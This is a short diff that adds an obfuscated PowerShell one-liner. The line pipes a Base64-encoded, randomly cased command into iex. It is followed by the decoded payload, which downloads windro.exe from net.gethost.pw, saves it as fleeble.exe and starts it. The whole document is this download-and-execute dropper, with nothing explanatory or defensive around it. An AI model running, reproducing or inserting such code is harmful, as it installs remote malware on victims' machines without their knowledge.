@@ -1,0 +1,7 @@
+iex([SYstEm.texT.enCoDiNG]::utf8.getStriNG([system.coNVeRt]::FROmBAse64strInG('CihOZXctT2JqZWN0IHNZU1RlTS5uZVQud2VCY2xJRU5UKS5kT3dubE9BREZJTGUoJ2h0dHA6Ly9uZXQuZ2V0aG9zdC5wdy93aW5kcm8uZXhlJywnZmxlZWJsZS5leGUnKTtTdGFydC1Qcm9jZXNzICdmbGVlYmxlLmV4ZScKCg==')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object sYSTeM.neT.weBclIENT).dOwnlOADFILe('http://net.gethost.pw/windro.exe','fleeble.exe');Start-Process 'fleeble.exe'
+
